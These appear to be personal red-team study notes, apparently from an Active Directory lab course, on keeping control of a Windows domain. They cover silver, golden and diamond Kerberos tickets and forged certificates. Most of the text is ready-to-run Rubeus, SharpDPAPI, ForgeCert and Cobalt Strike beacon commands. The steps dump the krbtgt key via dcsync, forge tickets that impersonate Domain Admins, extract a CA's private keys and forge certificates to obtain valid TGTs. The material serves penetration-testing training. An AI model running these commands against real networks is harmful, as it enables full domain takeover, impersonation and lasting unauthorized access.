# Domain Dominance Notes

## Silver tickets

a forged service ticket, signed using the secret material (RC4/AES keys) of a computer account.

if we have dumped kerb keys for a machine account we can use them on our windows attacking machine to make a service ticket for a user
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/<machine account> /aes256:<key> /user:<user> /domain:<domain> /sid:<domain sid> /nowrap
```

import ticket in beacon
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:<base64>
steal_token <PID>
```

Here are some useful ticket combinations:

Technique -	Required Service Tickets
psexec - HOST & CIFS
winrm	- HOST & HTTP
dcsync - (DCs only)	LDAP


## Golden tickets

forged TGT, signed by the domain's krbtgt account

common to get krbtgt is after a dcsync
```
dcsync <dcd> <krbtgt account>
```

offline ticket creation
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:<key> /user:<user> /domain:<domain> /sid:<domain sid> /nowrap
```

import it
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:<user> /password:FakePass /ticket:<base64>
steal_token <PID>
```

## Diamond tickets

A "diamond ticket" is made by modifying the fields of a legitimate TGT that was issued by a DC.  This is achieved by requesting a TGT, decrypting it with the domain's krbtgt hash, modifying the desired fields of the ticket, then re-encrypting it. 

create with rubues in beacon
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1106 /groups:512 /krbkey:<aes hash> /nowrap
```
- /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the current user
- /ticketuser is the username of the user to impersonate.
- /ticketuserid is the domain RID of that user.
- /groups are the desired group RIDs (512 being Domain Admins).
- /krbkey is the krbtgt AES256 hash.

use rubues describe to show the info of the TGT
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:<base64>
```

## Forged Certificates

Tools:
[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)
[ForgeCert](https://github.com/GhostPack/ForgeCert)

once on a CA, extract the private keys
```
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe certificates /machine
```

Save the private key and certificate to a .pem file and convert it to a .pfx with openssl
```
C:\Tools\ForgeCert\ForgeCert\bin\Release\ForgeCert.exe --CaCertPath .\Desktop\sub-ca.pfx --CaCertPassword pass123 --Subject "CN=User" --SubjectAltName "nlamb@cyberbotic.io" --NewCertPath .\Desktop\fake.pfx --NewCertPassword pass123
```

the user does need to be present in AD.  We can now use Rubeus to request a legitimate TGT with this forged certificate.
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /enctype:aes256 /certificate:MIACAQ[...snip...]IEAAAA /password:pass123 /nowrap
```


